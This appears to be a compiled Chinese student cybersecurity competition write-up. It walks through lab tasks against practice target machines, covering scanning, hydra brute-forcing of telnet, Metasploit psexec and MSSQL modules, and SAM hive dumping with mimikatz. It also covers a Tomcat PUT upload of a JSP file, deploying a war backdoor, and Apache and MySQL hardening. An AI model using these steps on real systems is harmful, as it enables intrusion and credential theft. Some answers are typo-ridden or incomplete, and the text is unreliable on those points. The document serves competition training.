![截图.png](    赛题环境解析/media/image124.png){width="5.760416666666667in"
height="2.8765485564304463in"}

![截图.png](    赛题环境解析/media/image125.png){width="5.760416666666667in"
height="2.631972878390201in"}

![截图.png](    赛题环境解析/media/image126.png){width="5.760416666666667in"
height="2.7422211286089238in"}

7.通过本地PC中渗透测试平台Kali2.0对服务器场景PYsystemWH5进行渗透测试，将该场景中回收站内文件的文档内容作为Flag值提交。（21分）

![截图.png](    赛题环境解析/media/image127.png){width="5.760416666666667in"
height="2.5908092738407698in"}

**服务远程控制**

**任务环境说明：**

ü 服务器场景名：20200609

ü 服务器场景操作系统：未知

ü 服务器场景用户名：root

ü 服务器场景密码：Admin123

1. 通过本地PC中渗透测试平台Kali对服务器场景进行系统版本扫描渗透测试，并将该操作显示结果中系统信息作为FLAG提交；

![截图.png](    赛题环境解析/media/image128.png){width="5.760416666666667in"
height="2.2924857830271215in"}

2. 通过本地PC中渗透测试平台windows7对服务器场景进行终端服务开启，并将该操作显示结果中服务端口号作为FLAG提交

查看服务管理器发现telnet

使用exploit/windows/smb/psexec模块输入用户名和密码

![截图.png](    赛题环境解析/media/image129.png){width="5.760416666666667in"
height="4.171767279090114in"}

![截图.png](    赛题环境解析/media/image130.png){width="5.760416666666667in"
height="2.4060279965004376in"}

![截图.png](    赛题环境解析/media/image131.png){width="3.5555555555555554in"
height="1.6578685476815398in"}

3. 通过本地PC中渗透测试平台Kali对服务器场景进行渗透测试，找到服务器场景中的管理员用户的桌面下中的可执行文件，并将全称作为FLAG提交；

![截图.png](    赛题环境解析/media/image132.png){width="5.760416666666667in"
height="2.2725492125984252in"}

4. 通过本地PC中渗透测试平台Kali对服务器场景进行渗透测试，找到服务器场景中的管理员桌面下的文本文档，将文件内容作为FLAG提交；

![截图.png](    赛题环境解析/media/image133.png){width="5.760416666666667in"
height="1.9430369641294838in"}

5. 通过本地PC中渗透测试平台Kali对服务器场景进行渗透测试，找到服务器场景中的管理员用户的文档中的文件，将文件内容作为FLAG提交；

![截图.png](    赛题环境解析/media/image134.png){width="5.760416666666667in"
height="2.2306856955380576in"}

![截图.png](    赛题环境解析/media/image135.png){width="5.760416666666667in"
height="3.8269061679790024in"}

6. 通过本地PC中渗透测试平台Kali对服务器场景进行渗透测试，找到服务器场景中的后门用户并将用户名作为FLAG提交；

![截图.png](    赛题环境解析/media/image136.png){width="4.888888888888889in"
height="3.5441841644794403in"}

7. 通过本地PC中渗透测试平台Kali对服务器场景进行渗透测试，找到服务器场景中的桌面背景，并将的文件全称作为FLAG提交；

![截图.png](    赛题环境解析/media/image137.png){width="5.760416666666667in"
height="2.777933070866142in"}

![截图.png](    赛题环境解析/media/image138.png){width="5.760416666666667in"
height="3.8638932633420824in"}

**2021重庆网络安全B-4:暴力破解(中职组)**

**任务环境说明：**

服务器场景名称：sql008

服务器场景用户名：administrator；密码：未知（封闭靶机）

   
1.使用渗透[机场](https://so.csdn.net/so/search?q=%E6%9C%BA%E5%9C%BA&spm=1001.2101.3001.7020)景kali中工具扫描服务器场景，将iis的版本号作为flag提交；

Flag：Microsoft [IIS](https://so.csdn.net/so/search?q=IIS&spm=1001.2101.3001.7020) httpd
7.5

![截图.png](    赛题环境解析/media/image139.png){width="5.760416666666667in"
height="2.9263167104111987in"}

   
2.使用渗透机场景windows7访问服务器场景，并下载某文件夹下的web目录下的username.txt 
       
 和 wxl_pass_burp.txt，并将username.txt中的用户数量作为flag提交；

Flag：7

   
3.使用渗透机场景windows7访问服务器中的暴力破解首页，并将首页的flag提交；

Flag :0601

   
4.使用渗透机场景windows7访问服务器场景web暴力破解页面（结合1、2题），进入基于表单 
       的暴力破解进行账号密码的爆破，将爆破后返回的flag提交；

![截图.png](    赛题环境解析/media/image140.png){width="1.9861111111111112in"
height="1.3066524496937884in"}

B模块 越权与下载

靶机:sql008

使用渗透机场景kali中工具扫描服务器场景，将web端口号当作flag提交

![截图.png](    赛题环境解析/media/image141.png){width="5.760416666666667in"
height="0.8959426946631671in"}

flag:8081

使用渗透机Kali
Linux，通过工具对靶机IP地址进行子目录扫描（使用directory-list-1.0.txt字典），将扫描到的子目录第二个结果的完整URL作为Flag值提交（地址部分用172.16.1.200替换）。

![截图.png](    赛题环境解析/media/image142.png){width="5.760416666666667in"
height="4.320312773403325in"}

flag:[[http://172.16.1.200:8180/web]{.underline}](http://172.16.1.200:8180/web)/

使用渗透机Kali
Linux，通过浏览器访问靶机网站，将登录后返回的字符串注释作为Flag值提交。

![截图.png](    赛题环境解析/media/image143.png){width="5.760416666666667in"
height="1.735249343832021in"}

使用渗透机Kali
Linux，通过浏览器访问靶机网站，获取靶机HTTP服务所使用的组和用户作为Flag值提交。

使用渗透机Kali
Linux，获取靶机系统盘根目录下flag.txt文件内容，并将文件内容作为Flag值提交

![截图.png](    赛题环境解析/media/image144.png){width="3.138888888888889in"
height="0.38584317585301836in"}

**任务三：系统漏洞利用与提权**

**任务环境说明：**

ü  服务器场景：PYsystem0033

ü  服务器场景操作系统：Ubuntu

ü  服务器场景用户名:未知 密码：未知

1\.
使用nmap扫描靶机系统，将靶机开放的端口号按从小到大的顺序作为FLAG（形式：\[端口1,端口2...,端口n\]）提交；（1分）

![截图.png](    赛题环境解析/media/image145.png){width="4.5in"
height="2.7604166666666665in"}

2\.
通过上述端口访问靶机系统，使用弱口令进行登录，将正确的用户名和密码作为FLAG（形式：\[用户名,密码\]）提交；（1分）

使用比赛给的密码和用户本爆破

![image.png](    赛题环境解析/media/image146.png){width="5.760416666666667in"
height="2.1249212598425196in"}

3\.
利用Kali渗透机生成反弹木马，将生成木马命令执行后提示的第四行的首个单词作为FLAG（形式：\[单词\]）提交；（1分）

![image.png](    赛题环境解析/media/image147.png){width="5.760416666666667in"
height="1.136865704286964in"}

flag:pyload

4\.
对上述木马文件进行修改后上传到靶机系统中，使用MSF开启监听，将获得的当前权限的用户名作为FLAG（形式：\[用户名\]）提交；（1分）

马用不了使用猜解决

![image.png](    赛题环境解析/media/image148.png){width="4.694444444444445in"
height="0.541266404199475in"}

5\.
查看系统内核版本信息，将系统内核版本号作为FLAG（形式：\[版本号\]）提交；（1分）

![image.png](    赛题环境解析/media/image149.png){width="3.736111111111111in"
height="0.4591863517060367in"}

6\.
在Kali攻击机中查找可使用的漏洞源码，将找到的漏洞源码文件名作为FLAG（形式：\[文件名\]）提交；（1分）

![image.png](    赛题环境解析/media/image150.png){width="5.760416666666667in"
height="1.8824365704286965in"}

7\.
利用上述漏洞源码后获得到的靶机/root下的唯一.txt文件的文件名作为FLAG（形式：\[文件名\]）提交；（1分）（2分）

![image.png](    赛题环境解析/media/image151.png){width="5.760416666666667in"
height="1.7332228783902013in"}

8\.
利用上述漏洞源码后将获得到的靶机/root下的唯一.txt文件的文件内容作为FLAG（形式：\[文件内容\]）提交。（2分）

![image.png](    赛题环境解析/media/image152.png){width="4.527777777777778in"
height="0.552930883639545in"}

；

**B-1：Windows操作系统渗透测试**

**任务环境说明：**

ü 服务器场景：Server2003(-p-才能扫出)（开放链接）

ü 服务器场景操作系统：Windows7

1.  
通过本地PC中渗透测试平台Kali对服务器场景Windows进行系统服务及版本扫描渗透测试，并将该操作显示结果中Telnet服务对应的端口号作为FLAG提交；

![截图.png](    赛题环境解析/media/image153.png){width="5.760416666666667in"
height="4.613138670166229in"}

flag:232

2.  
通过本地PC中渗透测试平台Kali对服务器场景Windows进行渗透测试，使用kali中hydra对服务器Telnet服务进行暴力破解（用户名为teltest），将hydra使用的必要参数当做FLAG进行提交（例：nmap
-s -p 22）；（字典路径/usr/share/wordlists/dirb/small.txt）

hydra -s 232 -l teltest -P /usr/share/wordlists/dirb/small.txt
telnet://172.16.102.247

![截图.png](    赛题环境解析/media/image154.png){width="5.760416666666667in"
height="2.410216535433071in"}

flag:hydra -l -P -s telnet

3.  
通过本地PC中渗透测试平台Kali对服务器场景Windows进行渗透测试，使用kali中hydra对服务器Telnet服务进行暴力破解（用户名为teltest），将破解成功的密码当做FLAG进行提交；（字典路径/usr/share/wordlists/dirb/small.txt）

flag:customer

4.  
通过本地PC中渗透测试平台win7对服务器场景Windows进行渗透测试，取得的账户密码有远程桌面权限，将该场景系统中sam文件使用reg相关命令提取，将完整命令作为FLAG提交；

![截图.png](    赛题环境解析/media/image155.png){width="5.760416666666667in"
height="1.7648939195100612in"}

flag:reg save hklm\\sam.hiv

5.  
通过本地PC中渗透测试平台win7对服务器场景Windows进行渗透测试，取得的账户密码有远程桌面权限，将该场景系统中system文件使用reg相关命令提取，将完整命令作为FLAG提交；

![截图.png](    赛题环境解析/media/image156.png){width="5.760416666666667in"
height="1.0170231846019249in"}

flag:reg save hklm\\system system.hiv

6.  
通过本地PC中渗透测试平台win7对服务器场景Windows进行渗透测试，将sam文件与system文件提取到本地，使用桌面mimikatz工具提取teltest密码信息，将提取信息的命令作为FLAG提交;

flag{lsadump::sam}

7.  
通过本地PC中渗透测试平台win7对服务器场景Windows进行渗透测试，将sam文件与system文件提取到本地，使用桌面mimikatz工具提取administrators密码信息，将提取到的hash值作为FLAG提交

![截图.png](    赛题环境解析/media/image157.png){width="5.760416666666667in"
height="4.691410761154856in"}

MSSQL数据库渗透测试（100分）

任务环境说明：

ü服务器场景：Jtest（用户名：administrator；密码：空）

ü服务器场景操作系统：Windows server2003

使用mssql_login，mssql_exec模块

1. 在本地PC渗透测试平台BT5中使用zenmap工具扫描服务器场景server2003所在网段(例如：172.16.101.0/24)范围内存活的主机IP地址和指定开放的1433、3306、80端口。并将该操作使用的命令中必须要使用的字符串作为FLAG提交；（10分）

![截图.png](    赛题环境解析/media/image158.png){width="5.760416666666667in"
height="5.679387576552931in"}

2. 通过本地PC中渗透测试平台BT5对服务器场景server2003进行系统服务及版本扫描渗透测试，并将该操作显示结果中数据库服务对应的服务端口信息作为FLAG提交；（10分）

![截图.png](    赛题环境解析/media/image159.png){width="5.760416666666667in"
height="5.679387576552931in"}

3. 在本地PC渗透测试平台BT5中使用MSF中模块对其爆破，使用search命令，并将扫描弱口令模块的名称作为FLAG提交；（10分）

![截图.png](    赛题环境解析/media/image160.png){width="5.760416666666667in"
height="0.3877985564304462in"}

4. 在上一题的基础上使用命令调用该模块，并查看需要配置的信息（使用show
options命令），将回显中需要配置的目标地址,密码使用的猜解字典,线程,账户配置参数的字段作为FLAG提交（之间以英文逗号分隔，例hello,test，..,..）；（10分）

![截图.png](    赛题环境解析/media/image161.png){width="5.760416666666667in"
height="5.679387576552931in"}

5. 在msf模块中配置目标靶机IP地址，将配置命令中的前两个单词作为FLAG提交；（10分）

![截图.png](    赛题环境解析/media/image162.png){width="5.760416666666667in"
height="0.5639566929133858in"}

6. 在msf模块中指定密码字典，字典路径为/root/2.txt爆破获取密码并将得到的密码作为FLAG提交；（14分）

![截图.png](    赛题环境解析/media/image163.png){width="5.760416666666667in"
height="4.777286745406824in"}

7. 在msf模块中切换新的渗透模块，对服务器场景server2003进行数据库服务扩展存储过程进行利用，将调用该模块的命令作为FLAG提交；（14分）

![截图.png](    赛题环境解析/media/image164.png){width="5.760416666666667in"
height="0.30905402449693786in"}

8. 在上一题的基础上，使用第6题获取到的密码并进行提权，同时使用show
options命令查看需要的配置，并配置CMD参数来查看系统用户，将配置的命令作为FLAG提交；（14分）

![截图.png](    赛题环境解析/media/image165.png){width="5.760416666666667in"
height="0.7089741907261592in"}

9. 在利用msf模块获取系统权限并查看目标系统的异常（黑客）用户，并将该用户作为FLAG提交。（8分）

![截图.png](    赛题环境解析/media/image166.png){width="5.760416666666667in"
height="2.675340113735783in"}

**任务六：端口扫描Python渗透测试**

**任务环境说明：**

ü 服务器场景：PYsystem0041

ü 服务器场景操作系统：未知

ü 服务器场景FTP用户名:anonymous 密码：空

1. 从靶机服务器的FTP上下载PortScan.py，编辑Python程序PortScan.py，实现基于TCP全开的端口扫描，填写该文件当中空缺的F1字符串，将该字符串作为Flag值提交；（1分）

2.继续编辑Python程序PortScan.py，实现基于TCP全开的端口扫描，填写该文件当中空缺的F2字符串，将该字符串作为Flag值提交；（1分）

3.继续编辑Python程序PortScan.py，实现基于TCP全开的端口扫描，填写该文件当中空缺的F3字符串，将该字符串作为Flag值提交；（1分）

4. 继续编辑Python程序PortScan.py，实现基于TCP全开的端口扫描，填写该文件当中空缺的F4字符串，将该字符串作为Flag值提交；（2分）

5\.
继续编辑Python程序PortScan.py，实现基于TCP全开的端口扫描，填写该文件当中空缺的F5字符串，将该字符串作为Flag值提交；（2分）

6\.
继续编辑Python程序PortScan.py，实现基于TCP全开的端口扫描，填写该文件当中空缺的F6字符串，将该字符串作为Flag值提交；（2分）
 

7\.
继续编辑Python程序PortScan.py，实现基于TCP全开的端口扫描，填写该文件当中空缺的F7字符串，将该字符串作为Flag值提交；（2分）

8\.
继续编辑Python程序PortScan.py，实现基于TCP全开的端口扫描，填写该文件当中空缺的F8字符串，将该字符串作为Flag值提交；（2分）

9\.
继续编辑Python程序PortScan.py，实现基于TCP全开的端口扫描，填写该文件当中空缺的F9字符串，将该字符串作为Flag值提交。（1分）

![截图.png](    赛题环境解析/media/image167.png){width="3.763888888888889in"
height="4.879501312335958in"}

**任务三：Windows操作系统渗透测试（永恒之蓝）**

**任务环境说明：**

ü 服务器场景：Server2105=Server05

ü 服务器场景操作系统：Windows（版本不详）（关闭连接）

1. 通过本地PC中渗透测试平台Kali对服务器场景进行系统服务及版本扫描渗透测试，并将该操作显示结果中445端口对应的服务版本信息字符串作为Flag值提交；

![截图.png](    赛题环境解析/media/image168.png){width="5.760416666666667in"
height="3.3101465441819773in"}

2. 通过本地PC中渗透测试平台Kali对服务器场景进行渗透测试，将该场景网络连接信息中的DNS信息作为Flag值
(例如：114.114.114.114) 提交；

![截图.png](    赛题环境解析/media/image169.png){width="5.760416666666667in"
height="3.2729647856517934in"}

3. 通过本地PC中渗透测试平台Kali对服务器场景进行渗透测试，将该场景中的当前最高账户管理员的密码作为Flag值提交；

![截图.png](    赛题环境解析/media/image170.png){width="4.902777777777778in"
height="2.1175831146106736in"}

4. 通过本地PC中渗透测试平台Kali对服务器场景进行渗透测试，将该场景桌面上111文件夹中唯一一个后缀为.docx文件的文件名称作为Flag值提交；

![截图.png](    赛题环境解析/media/image171.png){width="5.069444444444445in"
height="2.618170384951881in"}

5. 通过本地PC中渗透测试平台Kali对服务器场景进行渗透测试，将该场景桌面上111文件夹中唯一一个后缀为.docx文件的文档内容作为Flag值提交；

![截图.png](    赛题环境解析/media/image172.png){width="2.7083333333333335in"
height="1.0833333333333333in"}

6. 通过本地PC中渗透测试平台Kali对服务器场景进行渗透测试，将该场景桌面上222文件夹中唯一一个图片中的英文单词作为Flag值提交；

![截图.png](    赛题环境解析/media/image173.png){width="5.760416666666667in"
height="1.3850688976377952in"}

**任务六：隐藏信息探索**

**任务环境说明：**

ü 服务器场景：Web20200529

ü 服务器场景操作系统：未知 （关闭链接）

通过本地PC中渗透测试平台Kali对服务器场景Web20200529中的网站进行访问，找到登录界面中的FLAG，并将FLAG提交；

通过本地PC中渗透测试平台Kali对服务器场景Web20200529中的网站进行访问，找到登录界面背景中的FLAG，并将FLAG提交；

通过本地PC中渗透测试平台Kali对服务器场景Web20200529中的网站进行访问，在登录界面中登录，登录成功后在成功的界面中找到FLAG并提交；

通过本地PC中渗透测试平台Kali对服务器场景Web20200529中的网站进行访问，登录成功后找到页面中的月亮，将月亮中的信息解密，并将[解密后]{.mark}的信息作为FLAG提交；

通过本地PC中渗透测试平台Kali对服务器场景Web20200529中的网站进行访问，登录成功后找到页面中的十字星，将十字星中页面内容进行下载，将下载到的文件解密，并将解密后的文件内容作为FLAG提交；

通过本地PC中渗透测试平台Kali对服务器场景Web20200529中的网站进行访问，在登录界面中登录，登录失败后找到页面中的链接访问连接并下载文件，将文件中的隐藏文件全称作为FLAG提交；

通过本地PC中渗透测试平台Kali对服务器场景Web20200529中的网站进行访问，在登录界面中登录，登录失败后找到页面中的链接访问连接并下载文件，将文件中隐藏信息文件的内容作为FLAG提交；

通过本地PC中渗透测试平台Kali对服务器场景Web20200529中的网站进行访问，寻找每页中的隐藏信息，将每条信息按顺序合并，作为FLAG提交；

B-6任务六：Web安全应用

靶机：ubuntujoomla.img

\*任务说明：仅能获取Server6的IP地址

1.获取PHP的版本号作为Flag值提交；（例如：5.2.14）

2.获取MySQL数据库的版本号作为Flag值提交；（例如：5.0.22）

![截图.png](    赛题环境解析/media/image174.png){width="5.760416666666667in"
height="4.320312773403325in"}

3.获取系统的内核版本号作为Flag值提交；（例如：2.6.18）

4.获取网站后台管理员admin用户的密码作为Flag值提交；

flag:admin

5.找到/root目录中的txt文件，将文件内容作为Flag值提交。

**B-3 远程代码执行渗透测试**

**任务环境说明：**

ü  服务器场景：Server2128（开放链接）

ü  服务器场景操作系统：Windows

ü  用户名：administrator，密码：p@ssw0rd

1.  
找出靶机桌面上文件夹1中的文件RCEBackdoor.zip，使用静态反编译工具IDA对该压缩包中的程序进行分析，根据提示来分析目标文件，将包含恶意代码基址偏移的范围作为Flag值提交（提交形式：0x1000XXXX-0x1000XXXX）；

2.  
继续分析反汇编后代码，找出在恶意代码中的关键函数，将用于字符串拼接的函数名称作为Flag值提交；（提交形式：echo()）

3.  
继续分析反汇编后代码，找出在恶意代码中的关键函数，将用于格式化字符串的参数名称作为Flag值提交；（提交形式：%\*）

4.  
继续分析反汇编后代码，找出在恶意代码中的关键函数，将用于字符串传参的参数名称作为Flag值提交；（提交形式：%\*）

5.  
找出靶机Windows7桌面上文件夹1中的decode.py文件并完善此文件，填写该文件当中空缺的F1、F2、F3、F4四个字符串，将四个字符串拼接后的内容作为Flag值提交；

6.  
执行decode.py后将生产两个文件，对第二个文件中内容进行分析并解码，将其中出现的端口列表中的所有端口号一招从小到大的顺序依次排列作为Flag值（如：21,22,23,80）提交；

**B-4 中间件渗透测试**

**任务环境说明：**

ü 服务器场景：S[erver2129]{.mark}（关闭链接）(小皮后门)

ü 服务器场景操作系统：Windows

1. 通过本地PC中渗透测试平台Kali对服务器场景Server2129进行系统服务及版本扫描渗透测试，并将该操作显示结果中80端口对应的服务状态信息作为Flag值提交；

![image.png](    赛题环境解析/media/image175.png){width="5.760416666666667in"
height="2.6643930446194224in"}

2. 获取靶机Server2129系统中以英文"P"开头的用户名，并将该用户名作为Flag值提交；

![image.png](    赛题环境解析/media/image176.png){width="5.760416666666667in"
height="1.0660028433945756in"}

![image.png](    赛题环境解析/media/image177.png){width="5.760416666666667in"
height="2.9812292213473315in"}

![image.png](    赛题环境解析/media/image178.png){width="5.760416666666667in"
height="1.3016327646544181in"}

3. 找到靶机Server2129的网络适配器信息，将首选DNS服务器地址作为Flag值提交；

![image.png](    赛题环境解析/media/image179.png){width="5.472222222222222in"
height="2.8038626421697286in"}

4. 找到靶机Server2129中桌面上111文件夹中后缀为.docx的文件，将文档内容作为Flag值提交；

![image.png](    赛题环境解析/media/image180.png){width="5.760416666666667in"
height="3.6058858267716536in"}

![image.png](    赛题环境解析/media/image181.png){width="1.5277777777777777in"
height="0.27021872265966757in"}

5. 找到靶机Server2129中回收站内的文档，将文档内容作为Flag值提交；

![image.png](    赛题环境解析/media/image182.png){width="5.760416666666667in"
height="1.2865901137357831in"}

6. 找到靶机Server2129中的C:\\flag.txt文件，将文件的内容作为Flag值提交。

![image.png](    赛题环境解析/media/image183.png){width="1.6388888888888888in"
height="0.5845723972003499in"}

'B-2 任务二 Web 渗透测试

任务环境说明：

服务器场景：Pysystem2020

服务器场景操作系统：未知（关闭链接）

通过本地 PC 中渗透测试平台 Kali 对服务器场景 PYsystem2020
进行渗透测试，将该场景中 Apache 的版本号作为 FLAG（例如：2.2.3）提交；

2\. 通过本地 PC 中渗透测试平台 Kali 对服务器场景 PYsystem2020
进行渗透测试，将该场景中 PHP 的版本号作为 FLAG（例如：5.2.14）提交；

3\. 通过本地 PC 中渗透测试平台 Kali 对服务器场景 PYsystem2020
进行渗透测试，将该场景中数据库的版本号作为 FLAG（例如：5.0.22）提交；

4\. 通过本地 PC 中渗透测试平台 Kali 对服务器场景 PYsystem2020
进行渗透测试，将该场景的内核版本号作为 FLAG（例如：2.6.18）提交；

5\. 通过本地 PC 中渗透测试平台 Kali 对服务器场景 PYsystem2020
进行渗透测试，将该场景中网站后台管理员 admin 用户的密码作为 FLAG 提交；

**任务四：tomcat中间件安全与加固**

**任务环境说明：**

ü  服务器场景名称：w-win7

ü  服务器场景用户名：administrator；密码：未知（开放链接）

ü  渗透机场景：kali

ü  渗透机用户名：root，密码：toor

1.  通过渗透机场景kali中的工具对web服务器进行扫描，浏览web服务器网页，在首页中找到tomcat服务版本号，并将其版本号作为flag提交；

![截图.png](    赛题环境解析/media/image184.png){width="5.760416666666667in"
height="3.0707567804024496in"}

2.  已知此版本的tomcat具有上传漏洞，即向页面提交发送请求就会生成对应的文件。利用Burp
Suite工具进行抓包，向网站首页位置提交内容为\<%out.print("hello");%\>文件名字为good.jsp的请求。将Burp
Suite中的PUT请求作为flag提交（注：flag长度为16个单位长度）；

![截图.png](    赛题环境解析/media/image185.png){width="5.760416666666667in"
height="3.051068460192476in"}

3.  通过msfconsole工具使用root目录下的的password.txt文件进行tomcat后台账户密码的破解，并将账户密码作为flag提交。（flag格式：账户_密码）；

fcn

4.  用kali中的分离工具查看root目录下bm1.war文件中的flag文件，并将flag文件内容作为提交；

![截图.png](    赛题环境解析/media/image186.png){width="5.760416666666667in"
height="4.4143897637795275in"}

![截图.png](    赛题环境解析/media/image187.png){width="2.3055555555555554in"
height="0.500754593175853in"}

5.  通过第3题中的账户密码登陆网页（格式为服务器IP：8080/manager/html），将kali中root目录下的bm1.war文件上传后连接（连接地址为IP：8080/bm1/index.jsp）。在服务器中查找flag.txt文件，并将其内容作为flag提交；

查看后门连接密码

![截图.png](    赛题环境解析/media/image188.png){width="5.760416666666667in"
height="2.0867924321959754in"}

![截图.png](    赛题环境解析/media/image189.png){width="5.760416666666667in"
height="2.9455533683289588in"}

搜索flag.txt文件

![截图.png](    赛题环境解析/media/image190.png){width="5.375in"
height="3.21875in"}

![截图.png](    赛题环境解析/media/image191.png){width="5.760416666666667in"
height="1.2963221784776904in"}

6.  修改tomcat配置文件内容，使tomcat可以抵御第2题中的漏洞，将修改内容作为flag提交；

flag:true

任务一：攻击日志分析

**任务环境说明：**

ü  服务器场景：PYsystem0031

ü  服务器场景操作系统：未知

ü  服务器场景FTP用户名:anonymous 密码：空

1.从靶机服务器的FTP上下载attack.pcapng数据包文件，通过分析数据包attack.pcapng，找出黑客的IP地址，并将黑客的IP地址作为FLAG（形式：\[IP地址\]）提交；（1分）

![截图.png](    赛题环境解析/media/image192.png){width="5.760416666666667in"
height="2.3057961504811897in"}

继续查看数据包文件attack.pacapng，分析出黑客扫描得到的靶机开放的端口，将靶机开放的端口作为FLAG（形式：\[端口名1,端口名2,端口名3...,端口名n\]）从低到高提交；（1分）

![截图.png](    赛题环境解析/media/image193.png){width="3.111111111111111in"
height="3.7562248468941384in"}

继续查看数据包文件attack.pacapng，分析出黑客成功入侵后获得的操作系统的版本号，将操作系统的版本号作为FLAG（形式：\[操作系统版本号\]）提交；（1分）

![截图.png](    赛题环境解析/media/image194.png){width="5.760416666666667in"
height="2.949659886264217in"}

4.继续查看数据包文件attack.pacapng，分析出黑客成功入侵后执行的第一条命令，并将执行的第一条命令作为FLAG（形式：\[第一条命令\]）提交；（1分）

id

5.继续查看数据包文件attack.pacapng，分析出黑客成功入侵后执行的第二条命令，并将执行的第二条命令作为FLAG（形式：\[第二条命令\]）提交；（2分）

nohup \>/dev/null 2\>&1

echo sbVxiDemMsQEqpTH

6.继续查看数据包文件attack.pacapng，分析出黑客成功入侵后执行的第二条命令的返回结果，并将执行的第二条命令返回结果作为FLAG（形式：\[第二条命令返回结果\]）提交；（2分）

sbVxiDemMsQEqpTH

7.继续查看数据包文件attack.pacapng，分析出黑客成功入侵后执行的第三条命令的返回结果，并将执行的第三条命令返回结果作为FLAG（形式：\[第三条命令返回结果\]）提交。（2分）

Linux localhost.localdomain 2.6.32-504.el6.i686 #1 SMP Wed Oct 15
03:02:07 UTC 2014 i686 i686 i386 GNU/Linux

**任务二：数据库安全加固**

**任务环境说明：**

ü 服务器场景：CentOS6.8（用户名：root；密码：123456）

ü 服务器场景操作系统：CentOS6.8

ü 服务器场景操作系统安装服务：HTTP

ü 服务器场景操作系统安装服务：MYSQL

1. 进入虚拟机操作系统：CentOS
6.8，登陆数据库（用户名：root；密码：root），查看数据库版本号，将查看数据库版本号的命令作为flag提交；

flag:select version();

![截图.png](    赛题环境解析/media/image195.png){width="2.263888888888889in"
height="1.8674475065616798in"}

2. 进入虚拟机操作系统：CentOS
6.8，登陆数据库（用户名：root；密码：root），查看数据库版本号，将查询到的数据库版本号作为flag提交；

flag:5.1.73

3. 进入虚拟机操作系统：CentOS
6.8，登陆数据库（用户名：root；密码：root），查看数据库列表，将查看数据库列表的命令作为flag提交；

flag:show databases;

![截图.png](    赛题环境解析/media/image196.png){width="2.25in"
height="2.0416666666666665in"}

4. 进入虚拟机操作系统：CentOS
6.8，登陆数据库（用户名：root；密码：root），进入mysql数据库，查看所有用户及权限，找到可以从任意
IP 地址访问的用户，将该用户的用户名作为flag提交；（如有多个可以从任意 IP
地址访问的用户，提交形式为用户名\|用户名\|用户名\|用户名）

flag:test

![截图.png](    赛题环境解析/media/image197.png){width="3.625in"
height="2.90625in"}

5. 进入虚拟机操作系统：CentOS
6.8，登陆数据库（用户名：root；密码：root），进入mysql数据库，查看所有用户及权限，找到可以从任意
IP 地址访问的用户，使用drop命令将该用户删除，将操作命令作为flag提交。

flag:drop user \'test\'@\'%\';

![截图.png](    赛题环境解析/media/image198.png){width="3.8333333333333335in"
height="3.8854166666666665in"}

6. 进入虚拟机操作系统：CentOS
6.8，登陆数据库（用户名：root；密码：root），进入mysql数据库，改变默认
mysql 管理员的名称，将系统的默认管理员root 改为
admin，防止被列举，将操作命令作为flag提交。

flag:update mysql.user set user=\"admin\" where user=\"root\";

![截图.png](    赛题环境解析/media/image199.png){width="5.222222222222222in"
height="3.950543525809274in"}

**Apache安全配置**

**任务环境说明：**

ü 服务器场景：A-Server

ü 服务器场景操作系统： Linux

ü 服务器用户名：root;密码：123456

打开服务器场景（A-Server），通过命令行清除防火墙规则。在服务器场景上查看apache版本，将查看到的服务版本字符串完整提交；

![截图.png](    赛题环境解析/media/image200.png){width="3.25in"
height="0.7291666666666666in"}

httpd -v

flag:Apache/2.2.27 (Unix)

检测服务器场景中此版本apache是否存在显示banner信息漏洞，如果验证存在，修改配置文件将此漏洞进行加固，并重启Apache服务，将此加固项内容字符串(不包含状态)作为flag提交；

会有这banner信息漏洞，不然他也不会出这题目

find / -name \"httpd.conf\"

vi /usr/local/apache/conf/httpd.conf

![截图.png](    赛题环境解析/media/image201.png){width="5.760416666666667in"
height="1.9075481189851269in"}

Flag:ServerSignature

检测服务器场景配置是否可以浏览系统目录，如果验证存在将此漏洞在Apache配置文件中进行加固，寻找系统根目录/var/www
的配置属性，对该属性的原内容进行权限删除的方式加固，并重启Apache服务，将此加固项删减字符串作为flag提交；

![截图.png](    赛题环境解析/media/image202.png){width="5.277777777777778in"
height="2.607597331583552in"}

Flag：indexes

合理配置服务器场景apache的运行账户，并在httpd.conf中寻找运行帐户，将本服务配置的账户名称作为flag提交；

![截图.png](    赛题环境解析/media/image203.png){width="5.760416666666667in"
height="1.9329615048118984in"}

Flag:nobody

配置服务器场景中httpd.conf，限制禁止访问的文件夹，验证是否可以访问
/var/www/data
目录下index.php,如存在在此漏洞需进行加固，将此加固后完整字符串作为flag提交；（提示：（\<Directory
/var/www/data\>）\*\*\*\</Directory\>\*号为需要添加内容）

因为这个环境没有/var/www/data,所以我直接給比赛答案

这里可以借鉴上面写的

![截图.png](    赛题环境解析/media/image204.png){width="2.4583333333333335in"
height="2.34375in"}

Flag:Deny from all

配置服务器场景中httpd.conf，限制一些特殊目录的特定ip访问，如内部接口等。修改对data
目录的配置,重新启动apache 服务。将加固项固定部分作为flag提交；

比赛答案

![截图.png](    赛题环境解析/media/image205.png){width="2.4444444444444446in"
height="2.07882217847769in"}

Flag：Allow from

**任务五：系统漏洞**

任务环境说明：

ü 服务器场景名：Web20200529

ü 服务器场景操作系统：未知

ü 服务器场景用户名：未知（关闭链接）

通过本地PC中渗透测试平台Kali查看目标靶机共享的目录及IP地址白名单（将IP地址替换为0.0.0.0），将查看命令作为Flag提交；

![截图.png](    赛题环境解析/media/image206.png){width="5.760416666666667in"
height="3.826920384951881in"}

flag: showmont -e 0.0.0.0

通过本地PC中渗透测试平台Kali 查看目标靶机共享的目录及IP地址白名单，将查看命令执行结果的共享目录作为Flag提交；

flag:/

通过本地PC中渗透测试平台Kali渗透进入目标靶机，将挂载目标靶机文件系统到本地/mnt的命令（将IP地址替换为0.0.0.0）作为Flag提交；

![截图.png](    赛题环境解析/media/image207.png){width="5.736111111111111in"
height="1.8738659230096237in"}

flag:mount 0.0.0.0:/ /mnt

通过本地PC中渗透测试平台Kali计算目标靶机磁盘可用空间（以M或G为单位）作为Flag提交；

![截图.png](    赛题环境解析/media/image208.png){width="4.958333333333333in"
height="2.40625in"}

flag:4.9G

通过本地PC中渗透测试平台Kali使用"flag.txt"作为关键词搜索靶机文件系统中该文件的位置，并将搜索所需命令作为Flag提交；

![截图.png](    赛题环境解析/media/image209.png){width="5.277777777777778in"
height="1.7072101924759404in"}

flag:find /mnt -name \"flag.txt\"

通过本地PC中渗透测试平台Kali下载flag.txt文件，将文件中的Flag提交；

![截图.png](    赛题环境解析/media/image210.png){width="2.8194444444444446in"
height="1.8518864829396326in"}

flag:fLaG{0001030}

**任务四：文件包含的渗透与加固（150）**

**任务环境说明：**

ü 服务器场景名称：py008

